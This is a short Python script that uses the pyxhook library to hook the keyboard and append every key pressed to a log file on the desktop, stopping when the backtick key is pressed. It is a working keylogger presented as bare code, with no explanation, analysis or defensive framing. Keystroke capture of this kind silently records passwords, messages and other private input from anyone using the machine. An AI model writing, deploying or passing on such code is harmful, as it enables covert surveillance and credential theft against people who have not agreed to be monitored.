import pyxhook


def on_key_pressed(event):
    logger = open(file='/home/piotr/Desktop/keylogger.log', mode='a')
    logger.write(event.Key)
    logger.write('\n')

    if event.Ascii == 96:
        logger.close()
        my_hook.cancel()


my_hook = pyxhook.HookManager()
my_hook.KeyDown = on_key_pressed
my_hook.HookKeyboard()
my_hook.start()
